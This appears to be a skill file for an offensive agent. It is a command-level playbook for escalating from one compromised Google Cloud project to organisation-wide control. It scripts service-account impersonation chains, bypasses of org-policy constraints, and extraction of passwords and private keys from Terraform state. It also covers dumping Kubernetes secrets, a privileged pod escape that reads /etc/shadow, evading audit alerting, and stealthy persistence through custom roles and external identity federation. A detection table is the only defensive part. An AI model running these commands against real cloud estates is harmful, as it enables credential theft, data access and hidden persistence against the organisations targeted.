---
name: gcp-org-escalation
description: "GCP organization-level privilege escalation — cross-project pivoting, org policy bypass, service account impersonation chains, Terraform state secrets, and GKE cluster compromise. Escalate from single-project access to org-wide control."
metadata:
  subdomain: cloud
  when_to_use: "gcp google cloud organization escalation privilege cross-project pivot service account impersonation org policy bypass terraform state gke cluster iam enumeration gcloud resource manager bigquery cloud function"
  mitre_attack: "T1078.004, T1580"
  tags: "cloud gcp privilege-escalation org-level cross-project"
---

# GCP Organization-Level Privilege Escalation

Escalate from a single compromised GCP project to organization-wide access. GCP's hierarchical IAM (Org → Folder → Project → Resource) means permissions inherited from above are invisible at the project level. Cross-project service account impersonation, org policy constraint bypass, and Terraform state pillaging unlock lateral movement across the entire cloud estate.

## Quick Reference

```bash
# Current identity and project
gcloud auth list
gcloud config get-value project
gcloud organizations list

# Enumerate org-level IAM
gcloud organizations get-iam-policy <ORG_ID> --format=json

# List all projects in org
gcloud projects list --filter="parent.id=<ORG_ID>" --format="table(projectId,name,lifecycleState)"

# Test cross-project service account impersonation
gcloud auth print-access-token --impersonate-service-account=<SA_EMAIL>

# List org policy constraints
gcloud org-policies list --organization=<ORG_ID>

# Find Terraform state buckets
gsutil ls -p <PROJECT_ID> | xargs -I{} gsutil ls {} | grep -i terraform
```

## MITRE ATT&CK Mapping

| Technique | ID | Application |
|---|---|---|
| Valid Accounts: Cloud Accounts | T1078.004 | Abuse compromised SA or user for cross-project access |
| Cloud Infrastructure Discovery | T1580 | Enumerate projects, SAs, IAM bindings, resources across org |
| Account Manipulation: Additional Cloud Roles | T1098.001 | Add IAM bindings for persistence |
| Steal Application Access Token | T1528 | Extract SA keys, OAuth tokens, metadata tokens |
| Cloud Storage Object Discovery | T1619 | Discover Terraform state, config buckets |

## 1. IAM Enumeration at Organization Level

```bash
# List organization
ORG_ID=$(gcloud organizations list --format="value(ID)" | head -1)
echo "Org ID: $ORG_ID"

# Org-level IAM policy (who has org-wide access)
gcloud organizations get-iam-policy "$ORG_ID" --format=json > org_iam.json
cat org_iam.json | jq '.bindings[] | select(.role | test("admin|owner|editor|security")) | {role, members}'

# List all folders
gcloud resource-manager folders list --organization="$ORG_ID" --format="table(name,displayName)" > folders.txt

# Enumerate folder-level IAM
while read folder_id; do
  echo "=== $folder_id ==="
  gcloud resource-manager folders get-iam-policy "$folder_id" --format=json 2>/dev/null
done < <(gcloud resource-manager folders list --organization="$ORG_ID" --format="value(name)")

# List ALL projects in org
gcloud projects list --filter="parent.id=$ORG_ID" --format=json > all_projects.json

# Per-project IAM enumeration (find over-permissioned SAs)
for proj in $(jq -r '.[].projectId' all_projects.json); do
  echo "=== $proj ==="
  gcloud projects get-iam-policy "$proj" --format=json 2>/dev/null | \
    jq '.bindings[] | select(.members[] | test("serviceAccount")) | {role, members}'
done

# List all service accounts across projects
for proj in $(jq -r '.[].projectId' all_projects.json); do
  gcloud iam service-accounts list --project="$proj" --format="table(email,displayName)" 2>/dev/null
done

# Test current permissions
gcloud projects get-iam-policy <PROJECT_ID> --flatten="bindings[].members" \
  --filter="bindings.members:$(gcloud auth list --filter=status:ACTIVE --format='value(account)')" \
  --format="table(bindings.role)"
```

## 2. Cross-Project Service Account Impersonation

```bash
# Service account impersonation chain:
# SA-A (compromised) → impersonate SA-B (target project) → access target resources

# Check if current SA can impersonate other SAs
gcloud iam service-accounts list --project=<TARGET_PROJECT> --format="value(email)" | while read sa; do
  echo "Testing: $sa"
  gcloud auth print-access-token --impersonate-service-account="$sa" 2>/dev/null && echo "[+] CAN IMPERSONATE: $sa"
done

# Check who can impersonate a specific SA
gcloud iam service-accounts get-iam-policy <TARGET_SA_EMAIL> --format=json | \
  jq '.bindings[] | select(.role | test("iam.serviceAccountTokenCreator|iam.serviceAccountUser"))'

# Multi-hop impersonation (SA chaining)
# SA-A → impersonate SA-B → impersonate SA-C
gcloud auth print-access-token \
  --impersonate-service-account=<SA_B_EMAIL> \
  --include-email 2>/dev/null

# Then use SA-B's token to impersonate SA-C via API
TOKEN_B=$(gcloud auth print-access-token --impersonate-service-account=<SA_B_EMAIL>)
curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA_C_EMAIL>:generateAccessToken" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'

# Default compute SA often has Editor role on project — look for it
gcloud compute instances list --project=<PROJECT_ID> --format="table(name,serviceAccounts.email)" 2>/dev/null

# Workload Identity Federation — check for external identity trust
gcloud iam workload-identity-pools list --location=global --project=<PROJECT_ID> 2>/dev/null
```

## 3. Org Policy Constraint Bypass

```bash
# List active org policy constraints
gcloud org-policies list --organization="$ORG_ID" --format="table(constraint,listPolicy,booleanPolicy)"

# Common constraints to target:
# constraints/iam.allowedPolicyMemberDomains — restricts who gets IAM
# constraints/compute.vmExternalIpAccess — blocks external IPs
# constraints/iam.disableServiceAccountKeyCreation — blocks SA key export
# constraints/compute.requireShieldedVm — forces shielded VMs
# constraints/storage.uniformBucketLevelAccess — forces uniform bucket ACLs

# Check specific constraint
gcloud org-policies describe constraints/iam.disableServiceAccountKeyCreation \
  --organization="$ORG_ID" --format=json

# Bypass: constraints/iam.disableServiceAccountKeyCreation
# Cannot create key via CLI, but can still:
# 1. Use impersonation (no key needed)
gcloud auth print-access-token --impersonate-service-account=<SA_EMAIL>

# 2. Generate short-lived tokens via API
curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA_EMAIL>:generateAccessToken" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"43200s"}'

# 3. Sign JWTs for federated auth
curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA_EMAIL>:signJwt" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"payload":"{\"iss\":\"<SA_EMAIL>\",\"sub\":\"<SA_EMAIL>\",\"aud\":\"https://oauth2.googleapis.com/token\",\"iat\":'"$(date +%s)"',\"exp\":'"$(($(date +%s)+3600))"'}"}'

# Bypass: constraints/compute.vmExternalIpAccess
# Use Cloud NAT or IAP tunnel instead of external IP
gcloud compute ssh <INSTANCE> --tunnel-through-iap --project=<PROJECT_ID>

# Bypass: constraints/iam.allowedPolicyMemberDomains
# If constraint allows only @target.com, compromise a target.com identity
# Or use a service account (SAs are exempt from domain restrictions in some configs)
```

## 4. Terraform State Access

```bash
# Terraform state files contain secrets, credentials, and full resource details

# Find Terraform state in GCS buckets
for proj in $(jq -r '.[].projectId' all_projects.json); do
  gsutil ls -p "$proj" 2>/dev/null | while read bucket; do
    gsutil ls -r "$bucket" 2>/dev/null | grep -iE 'terraform|\.tfstate'
  done
done

# Download Terraform state
gsutil cp gs://<BUCKET>/terraform.tfstate /tmp/tfstate.json

# Extract secrets from state
cat /tmp/tfstate.json | jq -r '.. | .attributes? // empty | to_entries[] | select(.key | test("password|secret|key|token|private")) | "\(.key): \(.value)"' 2>/dev/null

# Extract service account keys from state
cat /tmp/tfstate.json | jq -r '.. | select(.type? == "google_service_account_key") | .instances[].attributes.private_key' 2>/dev/null | base64 -d > /tmp/sa_key.json

# Extract database credentials
cat /tmp/tfstate.json | jq '.. | select(.type? == "google_sql_user") | .instances[].attributes | {name, password}' 2>/dev/null

# Find Terraform Cloud/Enterprise state (if using remote backend)
# Check .terraform/terraform.tfstate for backend config
find / -name "*.tfstate" -o -name "backend.tf" -o -name ".terraform" 2>/dev/null

# Check if Terraform state bucket has versioning (access old secrets)
gsutil versioning get gs://<BUCKET>
gsutil ls -a gs://<BUCKET>/terraform.tfstate  # list all versions
gsutil cp gs://<BUCKET>/terraform.tfstate#<GENERATION_ID> /tmp/old_tfstate.json
```

## 5. GKE Cluster Pivoting

```bash
# Enumerate GKE clusters across projects
for proj in $(jq -r '.[].projectId' all_projects.json); do
  echo "=== $proj ==="
  gcloud container clusters list --project="$proj" --format="table(name,location,currentMasterVersion,currentNodeVersion)" 2>/dev/null
done

# Get cluster credentials
gcloud container clusters get-credentials <CLUSTER_NAME> --zone=<ZONE> --project=<PROJECT_ID>

# Enumerate cluster
kubectl auth can-i --list
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

# Extract secrets
kubectl get secrets --all-namespaces -o json | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, data: (.data | to_entries[] | {key: .key, value: (.value | @base64d)})}'

# Access cloud metadata from pod (node SA token)
kubectl run probe --image=alpine --restart=Never --command -- sh -c \
  "apk add curl jq && curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' | jq ."

# Workload Identity — check pod SA mappings
kubectl get serviceaccounts --all-namespaces -o json | \
  jq '.items[] | select(.metadata.annotations["iam.gke.io/gcp-service-account"] != null) | {namespace: .metadata.namespace, k8sSA: .metadata.name, gcpSA: .metadata.annotations["iam.gke.io/gcp-service-account"]}'

# Escape to node (if privileged pod or hostPath mount)
kubectl run escape --image=alpine --restart=Never --overrides='{
  "spec":{"hostPID":true,"hostNetwork":true,"containers":[{
    "name":"escape","image":"alpine","command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","bash","-c","id; cat /etc/shadow | head -3"],
    "securityContext":{"privileged":true}
  }]}
}'

# GKE node SA typically has compute/storage access — pivot from there
```

## 6. Cross-Service Pivoting

```bash
# BigQuery — access datasets across projects
for proj in $(jq -r '.[].projectId' all_projects.json); do
  bq ls --project_id="$proj" 2>/dev/null | grep -v "datasetId"
done

# Query cross-project BigQuery (if IAM allows)
bq query --use_legacy_sql=false "SELECT * FROM \`<TARGET_PROJECT>.<DATASET>.<TABLE>\` LIMIT 100"

# Cloud Functions — list and read source code
for proj in $(jq -r '.[].projectId' all_projects.json); do
  gcloud functions list --project="$proj" --format="table(name,runtime,status)" 2>/dev/null
done

# Download function source
gcloud functions describe <FUNCTION_NAME> --project=<PROJECT_ID> --format="value(sourceArchiveUrl)"
gsutil cp <SOURCE_URL> /tmp/function_source.zip

# Secret Manager — list and access secrets
for proj in $(jq -r '.[].projectId' all_projects.json); do
  echo "=== $proj ==="
  gcloud secrets list --project="$proj" --format="table(name,createTime)" 2>/dev/null
done

# Read secret value
gcloud secrets versions access latest --secret=<SECRET_NAME> --project=<PROJECT_ID>

# Cloud SQL — find databases
for proj in $(jq -r '.[].projectId' all_projects.json); do
  gcloud sql instances list --project="$proj" --format="table(name,databaseVersion,ipAddresses)" 2>/dev/null
done

# Pub/Sub — read messages from subscriptions
gcloud pubsub subscriptions list --project=<PROJECT_ID>
gcloud pubsub subscriptions pull <SUBSCRIPTION_NAME> --project=<PROJECT_ID> --limit=10 --auto-ack
```

## 7. Persistence at Org Level

```bash
# Create SA key for persistent access (if key creation allowed)
gcloud iam service-accounts keys create /tmp/persist_key.json \
  --iam-account=<SA_EMAIL> --project=<PROJECT_ID>

# Add IAM binding at org level (if org admin)
gcloud organizations add-iam-policy-binding "$ORG_ID" \
  --member="serviceAccount:<SA_EMAIL>" \
  --role="roles/viewer"

# Create custom role with minimal permissions (less visible than predefined roles)
gcloud iam roles create customAuditor --organization="$ORG_ID" \
  --title="Custom Auditor" \
  --permissions="resourcemanager.projects.list,iam.serviceAccounts.list,storage.buckets.list"

# Workload Identity Federation — trust external IdP for persistent access
gcloud iam workload-identity-pools create "audit-pool" \
  --location="global" --project=<PROJECT_ID>

# Add SA to group that has org-level permissions
gcloud identity groups memberships add \
  --group-email="<PRIVILEGED_GROUP>@<DOMAIN>" \
  --member-email="<SA_EMAIL>"
```

## Tools & Resources

| Tool | Purpose |
|---|---|
| gcloud CLI | Core GCP enumeration and exploitation |
| ScoutSuite | Multi-cloud security auditing (GCP module) |
| Cartography | GCP asset inventory and relationship mapping |
| GCPBucketBrute | GCS bucket discovery and enumeration |
| Hayat | GCP privilege escalation path finder |
| kubectl | GKE cluster exploitation |
| Terraform | State file analysis for secrets |
| Rhino Security gcpwn | GCP exploitation framework |

## Detection Signatures

| Indicator | Detection Method |
|---|---|
| Org IAM policy enumeration | Cloud Audit Logs: `GetIamPolicy` on organization resource |
| Cross-project SA impersonation | IAM audit: `GenerateAccessToken` calls across project boundaries |
| Terraform state bucket access | GCS access logs: `storage.objects.get` on tfstate files |
| GKE secret enumeration | K8s audit: `list secrets` across namespaces |
| SA key creation | IAM audit: `CreateServiceAccountKey` events |
| Org-level IAM binding changes | Cloud Audit: `SetIamPolicy` on organization |
| Custom role creation at org level | IAM audit: `CreateRole` on organization resource |
| Bulk project listing | Resource Manager audit: `ListProjects` with org filter |

## Error Handling & Edge Cases

- **Org-level permissions denied**: Start with project-level SA, enumerate impersonation chains to find a path upward
- **VPC Service Controls**: Resources behind a perimeter reject calls from outside; must compromise an identity inside the perimeter or find a bridge project
- **Org policy blocks SA key creation**: Use `generateAccessToken` API for short-lived tokens instead; impersonation doesn't require keys
- **No gcloud CLI available**: Use raw REST API with `curl` and bearer tokens from metadata service
- **Audit log alerting**: Reduce enumeration speed; target specific known-valuable projects instead of scanning all
- **Workload Identity in use**: SA keys may not exist; must compromise the workload (pod/VM) that is mapped to the target SA

## Decision Gate

```
IF single-project SA compromised:
  → Enumerate org structure (folders, projects)
  → Test impersonation against SAs in other projects
  → Search for Terraform state buckets (secrets goldmine)
  → Check GKE clusters for cross-project SA mappings

IF org-level read access obtained:
  → Dump all project IAM policies
  → Identify over-permissioned SAs (Editor/Owner on multiple projects)
  → Access Secret Manager across projects
  → Query BigQuery datasets for sensitive data

IF GKE cluster access:
  → Extract pod secrets and environment variables
  → Check Workload Identity mappings for GCP SA impersonation
  → Attempt node escape for compute SA token
  → Pivot to other clusters via shared SA

IF org admin achieved:
  → Create persistent org-level IAM binding
  → Deploy custom role for stealthy long-term access
  → Configure Workload Identity Federation for external trust
  → Access all Terraform state, secrets, and databases org-wide
```
